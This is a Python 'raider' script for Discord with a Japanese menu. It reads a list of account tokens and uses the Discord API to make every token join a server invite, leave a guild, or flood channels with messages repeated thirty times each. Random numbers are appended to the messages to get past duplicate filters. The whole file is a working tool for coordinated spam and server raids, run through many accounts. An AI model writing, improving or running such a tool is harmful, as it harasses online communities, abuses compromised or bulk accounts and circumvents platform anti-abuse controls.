import requests
import random
from time import time


print("""
██████╗░██╗████████╗░█████╗░██╗░░░░░░█████╗░  ██████╗░░█████╗░██╗██████╗░███████╗██████╗░
██╔══██╗██║╚══██╔══╝██╔══██╗██║░░░░░██╔══██╗  ██╔══██╗██╔══██╗██║██╔══██╗██╔════╝██╔══██╗
██║░░██║██║░░░██║░░░██║░░██║██║░░░░░██║░░██║  ██████╔╝███████║██║██║░░██║█████╗░░██████╔╝
██║░░██║██║░░░██║░░░██║░░██║██║░░░░░██║░░██║  ██╔══██╗██╔══██║██║██║░░██║██╔══╝░░██╔══██╗
██████╔╝██║░░░██║░░░╚█████╔╝███████╗╚█████╔╝  ██║░░██║██║░░██║██║██████╔╝███████╗██║░░██║
╚═════╝░╚═╝░░░╚═╝░░░░╚════╝░╚══════╝░╚════╝░  ╚═╝░░╚═╝╚═╝░░╚═╝╚═╝╚═════╝░╚══════╝╚═╝░░╚═╝

[1]入る
[2]抜ける
[3]送信
""")

choice = input("1/2/3:")

#入れないから最初にはいっておいて
if choice == "1":
   with open('tokens.txt', 'r') as f:
      token = f.readlines()
   for i in token:
     link = input("link:")
     apilink = "https://discordapp.com/api/v9/invites/" + link
     headers={'authorization': i}
     bot_invite = requests.post(apilink, headers=headers)

if choice == "2":
  guild = input("guildid:")
  with open('tokens.txt', 'r') as f:
      token = f.readlines()
  for i in token:
    headers={'Authorization': i}
    requests.delete(f"https://discord.com/api/v9/users/@me/guilds/{guild}",headers=headers)

if choice == "3":
  with open('tokens.txt', 'r') as f:
      token = f.readlines()
  with open('channel.txt', 'r') as f:
      channel = f.readlines()
  with open('content.txt', 'r') as f:
      content = f.readlines()
  for i in token:
    for a in channel:
      for u in content:
        for nu in range(30):
            url = 'https://discord.com/api/v9/channels/'+a+'/messages'
            data = {"content": f"{u} {random.choice(range(1000,99999))}"}
            header = {"authorization": i}
            r = requests.post(url, data=data, headers=header)
